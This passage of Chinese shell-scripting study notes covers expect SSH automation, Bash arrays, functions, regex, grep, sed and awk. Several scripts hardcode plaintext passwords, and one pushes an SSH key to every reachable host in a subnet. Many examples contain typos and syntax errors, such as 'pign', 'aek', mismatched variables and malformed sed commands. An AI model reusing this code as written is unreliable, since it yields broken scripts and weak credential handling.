ps:如果登录的新的机器与之前的指纹不一样，先删除本地保存的信息\n# expect打前站，先把公钥推过去，后面再用别的实现\n```\n\nssh初级例子1：\n\n```bash\n#!/usr/bin/expect\nset ip 192.168.0.1\nset user root\nset passwd 123456\nset timeout 5\n\nspawn ssh $user@$ip\nexpect {   #就是把接下来要出现的字符串等提前写好\n\t\"yes/no\" { send \"yes\\r\"; exp_continue }  # 当出现什么，怎么处理(没出现就继续)\n\t\"password:\" { send \"$passwd\\r\" };\n}\ninteract  #交互停在对方那边不退出来\n\n# 执行脚本: expect test.sh\n```\n\nssh初级例子2(升级版)：\n\n```bash\n#!/usr/bin/expect\nset ip [lindex $argv 0]   # 第一个位置参数(与shell的不通)\nset user [lindex $argv 1]\nset passwd 123456\nset timeout 5\n\nspawn ssh $user@$ip\nexpect {   #就是把接下来要出现的字符串等提前写好\n\t\"yes/no\" { send \"yes\\r\"; exp_continue }  # 当出现什么，怎么处理(没出现就继续)\n\t\"password:\" { send \"$passwd\\r\" };\n}\n#interact  # 交互停在对方那边不退出来\n# 干点别的事情\nexpect \"#\"            # 不用大括号也可以\n#send \"useradd xps\\r\"\nsend \"pwd\\r\"\nsend \"exit\\r\"\nexpect eof  # 结束expect\n```\n\n例子3：scp传递文件\n\n```bash\n######## 升级版\n#!/usr/bin/expect\nset ip [lindex $argv 0]   # 第一个位置参数(与shell的不通)\nset user [lindex $argv 1]\nset passwd 123456\nset timeout 5\n\nspawn scp -r /etc/xxx $user@$ip:/tmp\n\nexpect {   #就是把接下来要出现的字符串等提前写好\n\t\"yes/no\" { send \"yes\\r\"; exp_continue }  # 当出现什么，怎么处理(没出现就继续)\n\t\"password:\" { send \"$passwd\\r\" };\n}\nexpect eof  # 结束expect\n\n\n```\n\n例子4： 推公钥\n\n```bash\n# shell与expect一起用\n#!/bin/bash\n\n>ip.txt\npasswd=123\n\n#测试expect有没有装(以centos为例)\nrpm -q expect &/dev/null\nif [ $? -ne 0  ];then\n\tyum -y install expect\nfi\n\n# 判断是否有公钥\nif [ ! -f ~/.ssh/id_rsa ];then\n\tssh-keygen -P \"123\" -f ~/.ssh/id_rsa # 指定公钥的密码和位置\nfi\n\nfor i in {2..254}\ndo\n\t{\n\t\tip=192.168.0.$i\n\t\tpign -c1 -W1 $ip &/dev/null\n\t\tif [ $? -eq 0 ];then\n\t\t\techo \"$ip\" >> ip.txt\n\t\t\t# 开始expect\n\t\t\t/usr/bin/expect <<-EOF\n\t\t\tset timeout 10\n\t\t\tspawn ssh-copy-id $ip      # 推送公钥。 前面必须都是tab，不能有空格（:set list 查看是tab还是空格）\n\t\t\texpect {\n\t\t\t\t\"yse/no\" { send \"yes\\r\"; exp_continue }\n\t\t\t\t\"password:\" { send \"$passwd\\r\" }\n\t\t\t}\n\t\t\texpect eof\n\t\t\tEOF\n\t\tfi\n\t}&\ndone\nwait\necho \"finish...\"\n```\n\n```bash\n# 上一个例子, 已经实现了公钥认证，后面的操作就可以使用shell了，基本不用expect了\n# 重启之后查看机器的ip，直接用get_ip.sh脚本（就不用了一个一个去看了）\n#!/bin/bash\n>ping.txt\n# {2..254}  集合，  另一个序列: seq `2 254`\nfor i in {2..254}\ndo\n\t{\n\t$ip = 192.168.111.$i\n\tping -c1 -W1 $ip &>/dev/null  \n\tif [ $? -eq 0 ]; then\n\t\techo \"$ip\" | tee -a ping.txt\n\tfi\n\t}&    】\ndone\nwait    \necho \"finish !!!\"\n\n```\n\n\n\n\n\n\n\n#### 五.数组\n\n没有多维数组这个概念\n\n**定义**\n\n1.普通数组\n\n```bash\n# 普通数组：只能使用整数作为数组索引\nbooks=(linux shell awk docker)\nbooks=(linux shell awk [20]=docker)  # 索引20为docker\n# 从文件赋值\nbooks2=(`cat /etc/passwd`)\nbooks=(`ls /etc/`)\n# 中间值可以跳过\n```\n\n2.关联数组\n\n```bash\n# 关联数组：可以使用字符串作为数组索引（相当于字典）\ndeclare -A info # 先声明是关联数组\ninfo ([name]=xps [sex]=male [age]=20 [skill]=security)  # 赋值\n```\n\n**使用**\n\n```bash\necho ${books[3]}\necho ${info[name]}\n\n# 查看所有的数组\ndeclare -a\n# 查看所有的关联数组\ndeclare -A\n\n# 获取数组元素的索引号\necho ${info[@:1]}   # 从数组下标1开始\necho ${info[@:1:2]}   # 从数组下标1开始，访问两个元素\n\n# 获取所有的索引key\necho ${!info[@]}\n\n# 统计元素个数\necho ${#info[@]}\n\n# 数组中所有元数（等同于： ${info[*]}     ）\necho ${info[@]}\n```\n\n**遍历**\n\n1.按照个数遍历\n\n2.按照索引遍历\n\n例子:\n\n```bash\n#while方式\ni=0\nwhile read line\ndo\n\thosts[++i]=$line    #hosts是个数组\n\ndone </etc/hosts\n\nfor j in ${!hosts[@]}\ndo\n\techo \"$i: ${hosts[i]}\"\ndone\n\n\n\n\n########################################################################3\n# for方式   不是以换行分割（按照空格,tab等分割）\nOLD_IFS=$IFS\nIFS=$'\\n'  # 解决\nfor i in ${!hosts[@]}\ndo\n\techo \"$i: ${hosts[i]}\"\ndone\nfor j in ${!hosts[@]}\ndo\n\techo \"$i: ${hosts[i]}\"\ndone\n\nIFS=$OLD_IFS   # 不是全文都要，如果后门想用回车作为分隔符号\n\n\n\n\n```\n\n\n\n\n\n**实例**\n\n```bash\n#!/bin/bash\n\n## 1. 性别次数统计\n## 其实用awk一行搞定\nawk '{print $2}' sex.txt |sort |uniq -c\n\n## 这里还是先学基础的（`把要统计的对象作为数组的索引` ，首先是关联数组）\n#!/bin/bash\ndeclare -A sex\nwhile read line\ndo\n\t# 里面的第二列（m/f）\n\ttype=`echo $line |awk '{print $2}'`\n\tlet sex[$type]++    # sex[m]++ 性别的数量增加 \ndone < sex.txt\n# 遍历(通过索引)\nfor i in ${!sex[@]}       # 获取所有的索引key\ndo\n\techo \"$i: ${sex[$i]}\"   #变量尽量加$\ndone\n\n\n\n\n\n\n\n### 2. 统计不同类型shell的数量\n# /etc/passwd中\n#!/bin/bash\ndeclare -A shells   # 先定义关联数组\nwhile read line\ndo\n\t# 里面的第二列\n\ttype=`echo $line |awk -F\":\" '{print $7}'`  #按照冒号分割   {print $NF}最后一列\n\tlet shells[$type]++    # sex[m]++ 性别的数量增加 \n\ndone < /etc/passwd\n#输出\nfor i in ${!shells[@]}\ndo\n\techo \"$i: ${shells[$i]}\"   # /bin/bash :  5\ndone\n\n\n### 这是awk的强项\nawk -F\":\" '{print $NF}' /etc/passwd |sort |uniq -c\n\n\n\n\n## 3. 统计tcp连接状态数量\n#ss -an |grep 80\n#!/bin/bash\n\nwhile :\ndo\n\tunset status  # 取消， 重新声明\n\tdeclare -A status   # 先定义关联数组\t\n\ttype=`ss -an |grep :80 |aek '{print $2}'`  # 要统计的(是一个arr)\n\n\tfor i in $type\n\tdo\n\t\tlet status[$i]++    \n\tdone \n\n\t#输出\n\tfor i in ${!status[@]}\n\tdo\n\t\techo \"$i: ${status[$i]}\"    # SYN-SENT: 5\n\tdone\n\n\tsleep 1\n\tclear\ndone\n\n# 思想: 把要统计的对象最为索引，一直累加\n\n\n## 拓展：\n## 一.如果想一直看\n# 1. watch -n2 test.sh   # 每几秒看一次\n# 2. 脚本里面while循环(更麻烦)\n\n\n## 二.vim部分复制粘贴：  \n# ^V 块选择，然后按y复制， 最后找到地方p粘贴\n```\n\n\n\n\n\n#### 六.函数\n\n**定义**\n\n```bash\n# F1:\n函数名(){\n\t功能\n}\n\n# F2:\nfuncion 函数名{\n\t功能\n}\n\n```\n\n**调用**\n\n调用1\n\n```bash\n#例子：阶乘\n#!/bin/env bash\nfactorial(){\nfat=1\nfor((i=1;i<=50;i++))\ndo\n\tfac=$[$fac*$i]\ndone\necho \"5的阶乘:$fac\"\n}\nfactorial   # 调用\n```\n\n调用2\n\n```bash\n#!/bin/env bash\nfactorial(){\nfat=1\nfor((i=1;i<=$num;i++))\ndo\n\tfac=$[$fac*$i]\ndone\necho \"$num的阶乘:$fac\"\n}\nnum=5 # 调用之前先定义变量\nfactorial\n\n```\n\n调用3\n\n```bash\n#!/bin/env bash\nfactorial(){\nfat=1\nfor i in `seq $1`\ndo\n\tlet fac*=$i\ndone\necho \"$1的阶乘:$fac\"\n}\n\nfactorial $1  # 位置变量，调用\n```\n\n调用4\n\n```bash\n# 如果函数再另一个文件里面，先执行一下，后面再调用\n./f1.sh\n\n```\n\n\n\n**返回值**\n\n```bash\n#!/bin/env bash\nfun2(){\n\tread -p \"enter a number:\" num\n\tlet 2*$num\n\n\treturn $[2*$num]\n}\nfun2\necho \"funcion return value: %?\" # 上一个命令的返回值（函数值最后一条命令的返回的状态码）\necho \"funcion return: $?\"  # 函数的返回值(也可以自定义，但是默认shell返回码,最大不能超过255)\n```\n\n如果想返回字符串等:   函数的输出\n\n```bash\n#!/bin/env bash\nfun2(){\n\tread -p \"enter a number:\" num\n\techo $[2*$num]   # echo\n\t\n}\nresult=`fun2`     # 使用函数的输出\necho \"return_out value: $result\" \n\n```\n\n**参数的传递**\n\n1.位置参数\n\n```bash\n#!/bin/env bash\n\nif [ $# -ne 3 ];then   # 如果参数不是三个\n\techo \"Usage: `basename $0`par1 par2 par3 \"\n\texit\nfi\n\nfunction parm_func(){\n\techo \"$(($1 * $2 * s3))\"\n}\n\nresult=`parm_func $1 $2 $3`  # 分清：程序的位置参数，函数的位置参数\necho \"result is: $result\"\n```\n\n2.数组\n\n```bash\n#!/bin/env bash\nnum=(1,2,3,4,5)\n#echo \"${num[@]}\"  #打印所有元素\narr_parm() {\n\tlocal fa=1   ## 局部变量，只在函数内部生效\n\tfor i in \"$@\"\n\t#for i in $*\n\tdo\n\t\tlet fa*=$i\n\tdone\n\techo \"$fa\"\n}\n\n#arr_parm ${num[@]}\narr_parm ${num[*]}   # 数组所有 元素值\n\n\n# 拓展：\n# for i in $*     # 所有参数\n# for i  \n\n```\n\n传数组到函数中 --> 运算 --> 输出数组形式\n\n```bash\n#!/bin/env bash\nnum=(1,2,3,4,5)\narray() {\n\t#echo \"所有参数: $*\"\n\tlocal new_arr=(`echo $*`)\n\t#local new_arr=($*)\n\tlocal i\n\tfor ((i=0;i<$#;i++))\n\tdo\n\t\tout_arr[$i]=$[ ${[$i]}*5 ]\n\tdone\n\techo \"${out_arr[*]}\"\n}\n\nresult=`array${num[*]}`\necho ${result[*]}\n```\n\n```bash\n#!/bin/env bash\nnum=(1,2,3,4,5)\narray() {\n\tlocal i\n\tlocal new_arr=()\n\tfor i in $*\n\tdo\n\t\tnew_arr[j++]=$[$i*5]\n\tdone\n\techo \"${new_arr[*]}\"\n}\n\nresult=`array${num[*]}`\necho ${result[*]}\n\n# 函数接收位置参数 $1   $2    $3\n# 函数接收数组参数 $*   或  $@\n#函数将接收到的所有参数赋值给数组   new_arr=($*)\n```\n\n\n\n\n\n#### 七.正则\n\n大多数程序中，正则表达式被放在两个正斜杠之间, 比如：`/L[oO]ve/`\n\n**入门小例子**\n\n```bash\n# 简单实例（不严谨的例子，我们写shell脚本没必要写那么复杂，我们的脚本是给自己用的多）\n匹配数字：    ^[0-9]+$\n匹配Email：\t [a-z0-9_]+@[a-z0-9]+\\.\n匹配IP：\t [0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\n\t\t或者  [[:digit:]]{1,3}\\.[[:digit:]]{1,3}\\.[[:digit:]]{1,3}\\.[[:digit:]{1,3}\n\n\n# \negrep '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' /etc/sysconfig/network-scripts/ifcfg-eth0\n```\n\n\n\n**正则 元字符**\n\n注意和shell的元字符是不太一样的\n\n```bash\n# 由执行模式匹配的操作的程序来解析，比如vi，grep，sed，awk，python\n# 只要不是shell，就是正则的元字符\n\nrm -rf *.pdf  # shell中的*， 匹配任意\ngrep 'c*' /etc/passwd   # c出现0次或者多次\negrep 'c+' /etc/passwd   # +要使用egrep或反斜杠\n\nvim中替换： `:%s/\\<[tT]om\\>/TOM/g`    # 尖括号括起来的是单词\n\n## 例子：\ngrep \"sh$\" /etc/passwd\ngrep \"ro*t\" /etc/passwd\ngrep \"^[rot]\" /etc/passwd   # 以r或o或t开头的\n```\n\n1.基本元字符\n\n```bash\n^\t\t行首定位符\t\t\t\t\t^love\n$\t\t行位定位符\t\t\t\t\tlove$\n.\t\t匹配单个字符\t\t\t\t\tl..e\n*\t\t匹配前导符0到多次\t\t\t\tab*love\n.*\t\t任意多个字符\t\n[]\t\t匹配指定范围内的一个字符\t\t[lL]ove\n[-]\t\t匹配指定范围内的一个字符\t\t[a-z0-9]ove\n[^]\t\t匹配不再指定组内的一个字符     [^a-z0-9]ove\n\\\t\t用来转义元字符\t\t\t\tlove\\.\n\\<\t\t词首定位符\t\t\t\t\t\\<love\n\\>\t\t词尾定位符\t\t\t\t\tlove\\>\n\\(..\\)  匹配稍后使用的字符的标签\t\t :%s/172.16.130.1/172.16.130.5/\n\t\t\t\t\t\t\t\t\t :%s/\\(172.16.130.\\)1/\\15/\n\t\t\t\t\t\t\t\t\t :%s/\\(172.\\)\\(16.\\)\\(130.\\)1/\\1\\2\\35/\n\t\t\t\t\t\t\t\t\t :3,9s/\\(.*\\)/#\\1/   # 把第3-9行整行注释掉\n\n\n# 大括号每一半前面要加斜线记得\nx\\{m\\}\t     字符x重复出现m次\t\t\t\t o\\{5\\}\nx\\{m,\\}   \t 字符x重复出现m次以上\t\t\t o\\{5,\\}\nx\\{m,n\\}\t 字符x重复出现m次\t\t\t\t o\\{5,10\\}\n\n```\n\n 2.拓展正则表达式元字符\n\n```bash\n+\t\t\t\t匹配一个或多个前导字符\t\t[a-z]+ove\n?\t\t\t\t匹配零个或一个前导字符\t\tlo?ve   # o出现0次或1次    ss -an |egrep ':80:22\\>'\na|b  \t\t\t匹配a或b\t\t\t\t\t\tlove|hate\n()\t\t\t\t组 字符 \t\t\t\t\t\tloveablle|rs    love(able|rs)ov+  (ov)+   ov+   # 里面内容作为一个整体\n(..)(..)\\1\\2\t标签匹配字符\t\t\t\t\t(love)able\\1er      # 不带斜线\n\nx{m}\t\t\t字符x重复出现m次  \t\t\to{5}\nx{m,}\t\t\t字符x重复至少m次\t\t\t\to{5,}\nx{m,n}\t\t\t字符x重复m到n次\t\t\t\to{5,10}\n\n```\n\n 3.POSIX字符类 （类似于shell中环境变量，已经定义好的）\n\n```bash\n[:alnum:]\t\t字母与数字字符\t\t\t\t\t\t[[:alnum:]]+        # 外面的方括号是包里面的\n[:alpha:]\t\t字母字符（包括大小写字母）\t\t\t\t[[:alpha:]]{4}\n[:blank:]\t\t空格与制表符\t\t\t\t\t\t\t[[:blank:]]*\n[:digit:]\t\t数字\t\t\t\t\t\t\t\t\t[[:digit:]]?\n[:lower:]\t\t小写字母\t\t\t\t\t\t\t\t[[:lower:]]{5,}\n[:upper:]\t\t大写字母\t\t\t\t\t\t\t\t[[:upper:]]+\n[:punct:]\t\t标点符号\t\t\t\t\t\t\t\t[[:punct:]]\n[:space:]\t\t包括换行符、回撤等在内的所有空白\t\t[[:space:]]+\n```\n\n带括号与不带括号：\n\n<img src=\"http://image.xpshuai.cn/带括号与不带括号.png\"></img>\n\n正则匹配实例：vim中查找替换\n\n```bash\n# 空行：\n/^$/\n/^[\\t]*$/\n\n# 注释行：\n/^#/\n/^[\\t]*#/\n\n```\n\n\n\n**grep**\n\n- grep\t   文件中查找指定的正则表达式\n- egrep \t拓展的egrep，支持更多的正则表达式元字符\n- fgrep\t  固定grep(fixed grep),有时也被称作快速(fast grep), 它按字面解释所有的字符\n\n```bash\n#过滤（尽量加引号）\ngrep [选项] PATTERN 文件 文件 文件\n\ngrep -q \"root\" /etc/passwd : echo $?\n# 返回值：\n# 0  找到\n# 1  没找到\n# 2  找不到指定文件\n\n\n# grep的输入可以来自：文件、标准输入、管道\nss -an |grep \":22$\"\nll |grep '^d'   # 找出目录\n\n\n\n\n```\n\n使用的元字符\n\n```bash\ngrep：     使用基本元字符集  ^, $, ., *, [], [^], \\<\\>, \\(\\),  \\{\\}, \\+, \negrep：\t   使用扩展元字符集  ?, +, {}, |, ()\n\n#\nNote: grep也可以使用扩展元字符集，仅需再这些元字符前置一个反斜线(尖号不行)\n\n\\w    所有字母与数字，称之为字符，即 [a-zA-Z0-9]\n\\W    与上面相反，非字符     [^a-zA-Z0-9]\n\\b    词边界\n\n\n# grep -E 或 egrep\n\n```\n\ngrep选项\n\n```bash\n-v\t\t取反，只显示不匹配的\n-i  \t忽略大小写\n-l      只列出匹配行所在的文件名(哪些文件里面有这些匹配)\n-n      再每一行前面加上他所在文件中的相对行号\n-c      显示成功匹配的行数\n-s      禁止显示文件不存在或文件不可读的错误信息\n-q      静默\n--color 颜色\n-R, -r  递归针对目录\n-o      只显示匹配的内容\n-B      前几行  grep -C2 'root' /etc/passwd \n-A      后几行\n-C      上下几行\n\n\nnmap --help |grep '\\-u'  # 查看帮助文档里的-u\n```\n\n\n\n\n\n\n\n\n\n\n\n#### 八.sed\n\nsed: 流编辑器，在线的、非交互式的编辑器（而vi是交互式的）\n\n\n\n**sed工作流程**\n\n文本文件  -> sed的模式空间(缓冲区)  --> 输出\n\n**命令格式**\n\n```bash\n#sed [options] 'cmd' file(s)\nsed [options] -f scriptfile file(s)\n\n\n```\n\n> sed不管是够找到指定的模式，他的退出状态都是0。 只有当命令`语法存在错误`时候，才是非0\n\n\n\n**可以在命令行，也可以在脚本里面使用**\n\n```bash\nsed 'd' /etc/test   # d 删除\nsed '4d' /etc/test   # 4d 删除第四行\n# i 修改文件(不是输出到屏幕上)\n```\n\n\n\n**支持正则表达式**\n\n支持的元字符\n\n```bash\n# 基本元字符集: ^, $, ., *, [], [^], \\<\\>, \\(\\), \\{\\} \n# 扩展元字符集: ?, +, {}, |, ()\n```\n\n使用扩展元字符的方式\n\n```bash\nsed  --help|grep '\\-r'\n # \n \\+\n sed -r \n```\n\n基本用法：\n\n```bash\nsed -r '' /etc/test    # '' 没任何动作\nsed -r 'd' /etc/test \nsed -r 'p' /etc/test    # p 打印\nsed -r -n 'p' /etc/test    \nsed -r -n '/root/p' /etc/test    # -n  静默方式\n# 上面四种不建议用(打印这种事情用不着sed，有别的打印就行)\n\n\n### 下面的功能才重点学\nsed -r 's/root/xps' /etc/test    # 所有行查找替换,root换成大小写（只替换一次）\nsed -r 's/root/xps/g' /etc/test  # g 全局\nsed -r 's/root/xps/gi' /etc/test  # i  忽略大小写\n\nsed -r '/root/d' /etc/test   # 没有s就是查找， 查找带root的行，然后删除\nsed -r '\\#root#d' /etc/test   # 查找：可以使用#等符号-->不一定要斜线，但是前面要加\\转义；查找替换:不用转义\n\n\n```\n\n**地址(定址)**\n\n```bash\n#!/bin/bash\n\n# 用于决定对哪些行进行编辑。地址形式可以是数字、正则或二者的结合(如果没有指定,sed将处理输入文件中的所有行)\n\nsed -r 'd' /etc/test \nsed -r '3d' /etc/test \nsed -r '1,3d' /etc/test \nsed -r '/root/d' /etc/test    # 删除root的行\nsed -r 'root/,5d' /etc/test   # 从root行开始，到第5行删除\nsed -r 's/root/xps/g' /etc/test   # 替换\n\nsed -r '/^adm/,20d' /etc/test  # 从adm开头的那一行，删除到第20行\nsed -r '/^adm/,+20d' /etc/test # 从adm开头的那一行，再往后删除20行\nsed -r '/2,5d' /etc/test   # 第二行到第五行 \nsed -r '/root/d' /etc/test    # 带root的行删除\nsed -r '/root/!d' /etc/test  # 除了root行以外都删除\n\nsed -r '1~2d' /etc/test   # 删除所有奇数行(从1开始，每隔两行删)\nsed -r '0~2d' /etc/test   # 删除所有偶数行\n\n\n# 拓展：\nvim中： 使用 `:r /etc/passwd` 来读取文件内容\n```\n\n**命令**\n\n```bash\n# 告诉sed对指定行进行何种操作\na  \t\t在当前行后添加一行或多行\nc \t    用新文本修改(替换)当前行中的文本\nd \t\t删除行\ni \t\t在当前行前插入文本\nl\t    列出非打印字符\np \t\t打印行 \nn\t\t读入下一输入行，并从下一条命令而不是第一条命令开始对其的处理\nq\t\t结束或退出sed\n!\t\t取反(对所选行以外的所有行应用)\n\n\ns \t\t用一个字符串替换另一个\n\t\ts 替换标志\n\t\tg 在行内进行全局替换\n\t\ti 忽略大小写\nr \t\t从文件中读\nw \t\t将行写入文件\ny\t\t将字符转换为另一个字符（不支持正则）\n\n\nh \t\t把模式空间里的内容复制到暂存缓冲区(覆盖)\nH \t\t把模式空间里的内容支架到暂存缓冲区中\ng \t\t取出暂存缓冲区中的内容，将其复制到模式空间，覆盖该处原有内容\nG \t\t取出暂存缓冲区中的内容，将其复制到模式空间，追加在原有内容后门\nx \t\t交换暂存缓冲区域模式空间的内容\n\n```\n\n\n\n**例子**\n\n```bash\n## 例子\n\n# d 删除\nsed -r '3d' datefile   # 删除第三行\nsed -r '3d' datefile\nsed -r '3{d;}' datefile\nsed -r '3d{h:d}' datefile  # 先保存，再删除\n\nsed -r '3,$d' datefile   # 删除3到最后一行\nsed -r '$d' datefile     # 删除最后一行\nsed -r '/nrth/d' datefile  # 删除满足这个匹配的行\n\n# s 替换 \nsed -r 's/west/north/g' datefile\nsed -r 's/^west/north/' datefile      \nsed -r 's[0-9][0-9]$/&.5' datefile   # &代表在查找串中匹配到的内容       # 拓展vim中在某行的后门加上xxx：  :3,5s/.*/&XXX/g\n\n#vim拓展1:    :%s/.*/#&/g   在所有行前面加注释\n#vim拓展1:    :3,5s/~/#&/        和sed是一样的\nsed -r '%s/(.)(.)(.*)/\\1xxx\\2\\3/' passwd            # 把每行第二个字符前面加xxx\nsed -r 's/(Mar)got/\\1inane/g' datefile\n\n# r 读文件\nsed -r 's/Suan/r /etc/newfile' datefile  # 到Suan这一行的时候，读入一个新文件\nsed -r '2r /etc/hosts' a.txt   # 处理到第二行的时候，读入一个新文件\nsed -r '/2r /etc/hosts' a.txt   # /2   带有2的时候，读入...\n\n# w 写文件\nsed -r '/north/w newfile' datafile   # 把north的行保存到新文件中去\nsed -r '3,$w /new.txt' datafile      # 第三行到最后一行，保存...\n\n# a 追加\nsed -r '/root/a 1111111' datafile   # 有root的行，就在后面添加11111\nsed -r '2a/ 1111111' datafile       # 第二行，添加 111111111\n\n# i 在前面插入\nsed -r '/root/i 1111111' datafile    # 有root的行，就在前面添加11111\nsed -r '2i/ 1111111' datafile        # 第二行，在前面添加 111111111\n\n# c  修改替换\nsed -r '2c/ 1111111' datafile        #   第二行，替换为 111111111\n\n\n# n 获取下一行命令\nsed -r '/eastern/{n; d}' datafile  # 这行没有明显标志，用上面明显的隔山打牛\n\n\n# G g H h 暂存和取用命令\nsed -r  '1h;$G' /etc/hosts   # 处理到第一行时候，暂存；到最后一行，取过来  （第一行复制到最后一行）\nsed -r  '1{h;d};$G' /etc/hosts    # 第一行移动到最后一行\nsed -r  '1h;2,$G' /etc/hosts   # 处理到第一行时候，暂存;到第二行和最后一行，取过来  \n\n```\n\n**模式空间/暂存空间**\n\n```bash\n## 小写是覆盖，大写是追加\n模式空间   h  H -->    暂存空间\n模式空间   <--- g  G   暂存空间\t\n\n\nsed -r  'G;G' /etc/hosts   # 所有行\nsed -r  'g;g' /etc/hosts   \n\n\n# 暂存空间个模式空间互相转换命令   x\nsed -r '4h; 5x; 6G' /etc/hosts   # 处理到第四行覆盖到暂存空间，到第五行:。。。\n\n```\n\n\n\n **反向选择**\n\n```bash\nsed -r '3d' /etc/hosts\nsed -r '3!d' /etc/hosts\n\n```\n\n\n\n**多重编辑选项** \n\n```bash\n# -e\nsed -r -e '1,3d' -e 's/java/python/' datafile   # 第一行到第三行删除，后面的替换覆盖\n\nsed -r '2{s/java/python/g; s/php/go/g}' datafile   # 一行里面替换两次\n\n```\n\n\n\n**常见操作**\n\n```bash\n############ 常见操作\n\n# 删除#注释行\nsed -ri '/^#/d' file.conf   # 这种情况必须是第一个就是注释符\nsed -ri '/^[\\t]*#/d' file.conf   # 如果是前面有空格或tab然后才是注释符\n\n# 删除//注释行\nsed -ri '\\Y/^[\\t]*//Yd' file.conf \n\n# 删除无内容空行\nsed -ri '/^[\\t]*$/d' file.conf \n\n# 删除注释行及空行\nsed -ri '/^[\\t]*#|^[\\t]*$/d' file.conf \nsed -ri '/^[\\t]*(#|$)/d' file.conf \n\n# #加注释（vim是一样是）\n:%s/.*/#&/g   在所有行前面加注释\n:3,5s/^/#&/        和sed是一样的\n\nsed -r '1,5s/^/#/' c.txt\nsed -r '3,$ s/^#*/#/' c.txt  # 将行首0到多个井换成一个井\n# 如果井前有空格或tab等\nsed -r '3,$ s/^[\\t]*#*/#/' c.txt \n\n\n# sed使用外部变量(使用双引号)\nvar1=111\nsed -ri \"3a$val1\" /etd/hosts\n\nsed -ri '$a'\"$val1\" /etd/hosts  # 第一个单引号是`最后一行`，第二个里面是变量\n\nsed -ri \"\\$a$val1\" /etd/hosts   # 把$a转义一下也行\n\n\n\ncat a.txt\ntac a.txt   # 从后往前倒序（ sed -r '1!G; $!d' a.txt  推导一下弄明白  ）\n```\n\n\n\n\n\n#### 九.awk\n\n   awk本身也是一种编程语言（ps:我们使用的不是纯粹的awk，而是gawk）\n\n- sed是修改文件\n- awk是用来统计\n\n\n\n**语法格式**\n\n`awk [options] 'cmd' filenames`\n\n options 选项\n\n`-F   指定分隔符，默认是空格或tab`\n\n**command**\n\n```bash\n# BEGIN{}\t\t\t行处理前\n# {}\t\t\t\t行处理（有几行就处理几次）\n# END\t\t\t\t行处理后\n\nawk 'BEGIN{print 1/2} {print \"ok\"}END{print \"------\"}' /etc/hosts\n\n\n# BEGIN{}    通常用于定义一些变量，比如: BEGIN{FS=\":\";OFS=\"---\"}  # OFS 输出时候的字段分隔符\nawk 'BEGIN{FS=\":\"} {print $1}' passwd   # 在处理之前，(FS)就指定了分隔符\n\n\n```\n\n**awk命令格式**\n\n```bash\n# awk 'pattern' filename \t\t\t\nawk '/root/' /etc/passwd\n\n# awk '{action}' filename \t\t\t\nawk -F: '{print $3}' /etc/passwd\n\n# awk 'pattern {action}' filename     \nawk -F\":\" '/root/{print $3}' /etc/passwd\t\t\t\t\t\t\t\t\nawk 'BEGIN{FS=\":\"} /root/{print $3}' /etc/passwd\n\n# command |awk 'pattern {action}' \ndf -P |grep '/' |awk '$4'>25000 {print $4}    # 除去第一行，如果大于25000就打印第四列\n\n```\n\n**awk工作原理**\n\n<img src=\"http://image.xpshuai.cn/awk工作原理.png\"></img>\n\n**记录与字段相关的`内部变量`**\n\n```bash\n## 可以通过 man awk 查看\n\n# $0  awk变量保存当前记录的内容\nawk -F\":\" '{print $0}' /etc/passwd\t\n\n# NR  输入记录总的编号，显示行号\nawk -F\":\" '{print NR,$0}' /etc/passwd\t \n# FNR  当前记录文件的编号(处理多个文件，每个文件重新开始编号)\nawk -F\":\" '{print FNR,$0}' /etc/passwd /etc/passwd  \n# NF: 保存记录的字段数(这一行一共有多少字段),  $NF代表最后一个字段\nawk -F\":\" '{print $0,NF,$NF}' /etc/passwd\t\t\t\t\t\n\n# FS 输入字段分隔符，默认空格或tab\nawk 'BEGIN{FS=\":\"} {print $0}' /etc/passwd\t              \nawk -F'[:\\t]' '{print $0,NF,$NF}' /etc/passwd\n# OFS 输入字段分隔符，默认空格, OFS:输出分隔符\nawk 'BEGIN{FS=\":\";OFS=\"+++\"} {print $0}' /etc/passwd\t   \n\n# RS --记录分隔符(区分与FS字段分隔符) 默认换行符\nawk 'BEGIN{RS=\":\"} {print $0}' /etc/passwd\t\n# ORS \nawk 'BEGIN{ORS=\":\"} {print $0}' /etc/passwd\t\t\t\t\n\n# 将文件每一行合并为一行（ORS 输出记录分隔符）\nawk 'BEGIN{ORS=\"\"} {print $0}' /etc/passwd   \n\n```\n\n\n\n**格式化输出**\n\n```bash\n# 1.print\n# 2.printf  可以格式化（默认没有换行，手动加\\n）\ndate |awk '{print \"Month:\" $2\"\\nYear: \" $NF}'  # 只要不是变量，就要放到双引号里面\n\n# %s 字符串（-15s  15个字符，左对齐）  %f 浮点型， %d数值类型\nawk -F: '{printf \"%-15s %-10s %-15s\\n\", $1,$2,$3}' /etc/passwd\n\n\n```\n\n**awk模式和动作**\n\n模式：条件语句，复合语句，正则表达式。 包括两个特殊字典：BEGIN和END\n\n```bash\n### 模式可以是\n=======   正则表达式\n# 匹配记录（整行）\nawk '/^xps/' /etc/passwd   # awk '$0 ~ /^xps/' /etc/passwd   # ~  匹配\nawk '!/xps/' /etc/passwd   # awk '$0 !~ /^xps/' /etc/passwd\n\n\n# 匹配字段：匹配操作符(~!~)\nawk -F: '$1 ~ /^xps/' /etc/passwd   # \nawk -F: '$NF !~ /^bash$/' /etc/passwd  # 最后一列不是以bash结尾的\n\n\n=======   比较表达式\n# 用于比较 数字 与 字符串\n# >     <    == \nawk -F: '$3 == 0' /etc/passwd\nawk -F: '$3 == \"/xps/\"' /etc/passwd  # == 全部等于\nawk -F: '$3 ~ /xps/' /etc/passwd  # 正则匹配\nawk -F: '$NF ~ /xps/' /etc/passwd\n\n\n\n\n=======   条件表达式\nawk -F: '$3>200{print $0}' /etc/passwd  # $3大于200的，$0\n\nawk -F: '{ if($3>200) {print $0} }' /etc/passwd  # 推荐这么写 { if(){cmd1;cmd2} else{} }\nawk -F: '{ if($3>200) {print $0} else{print $1} }' /etc/passwd \n\n\n=======   算数运算\n#awk都按浮点数方式执行算数运算\nawk -F: '$3 * 10 > 500' /etc/passwd    \nawk -F: '{ if($3*10>500){print $0} }' /etc/passwd    # 如果$3*10>500，就...\n\n\n=======   逻辑操作符和复合模式\n&& \t逻辑与\t\n||  逻辑或\n！  逻辑非\nawk -F: '$1~/root/ && $3<=15' /etc/passwd\nawk -F: '$1~/root/ || $3<=15' /etc/passwd\nawk -F: '!($1~/root/ && $3<=15)' /etc/passwd\n\n\n=======   范围模式\nawk '/Tom,/Susan/' 